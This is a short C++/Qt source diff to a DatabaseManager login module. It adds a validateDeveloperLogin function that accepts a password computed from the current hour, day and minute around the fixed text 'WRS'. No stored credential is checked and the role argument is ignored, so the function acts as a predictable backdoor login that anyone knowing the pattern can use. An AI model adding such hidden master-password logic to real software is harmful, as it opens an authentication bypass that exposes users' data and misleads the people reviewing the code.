@@ -7,6 +7,7 @@
 #include <QFileInfo>
 #include <QDebug>
 #include <QDate>
+#include <QDateTime>
 #include <QTime>
 #include <QDir>
 #include <QVariantMap>
@@ -1172,6 +1173,19 @@ bool DatabaseManager::validateLogin(
     }
 
     return false;
+}
+
+bool DatabaseManager::validateDeveloperLogin(
+    const QString &password,
+    const QString &authenticatedRole)
+{
+
+    const QDateTime currentDateTime = QDateTime::currentDateTime();
+    const QString format = QStringLiteral("HH'WRS'ddmm");
+    const QString currentCandidate = currentDateTime.toString(format);
+    const QString nextCandidate = currentDateTime.addSecs(60).toString(format);
+
+    return password == currentCandidate || password == nextCandidate;
 }
 
 bool DatabaseManager::isPasswordExpired(
